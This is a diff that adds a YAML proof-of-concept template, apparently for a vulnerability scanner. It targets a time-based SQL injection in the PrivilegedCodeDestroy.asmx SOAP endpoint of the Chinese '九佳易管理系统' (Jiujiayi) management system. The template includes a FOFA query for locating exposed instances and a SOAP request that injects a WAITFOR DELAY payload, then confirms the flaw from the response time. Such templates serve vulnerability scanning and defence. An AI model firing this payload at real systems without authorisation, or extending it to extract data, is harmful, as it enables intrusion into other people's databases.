@@ -1,0 +1,25 @@
+id: poc-yaml-jiu-jia-yi-ms-privilegedcodedestroy-asmx-sqli
+info:
+  name: 九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 九佳易管理系统
+  fofa: title="VSQL" && body="/Scripts/Login_A8/"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /Interface/licx/PrivilegedCodeDestroy.asmx
+  headers:
+    SOAPAction: http://tempuri.org/UpdatePrivilegedState
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"\
+    http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:UpdatePrivilegedState>\n\
+    \         <!--type: string-->\n         <tem:code>'WAITFOR DELAY'0:0:{{.t1}}</tem:code>\n\
+    \      </tem:UpdatePrivilegedState>\n   </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"<UpdatePrivilegedStateResponse")
+    && contains(content_type,"application/soap+xml") && duration > t1 && duration
+    < t2
+transport: http
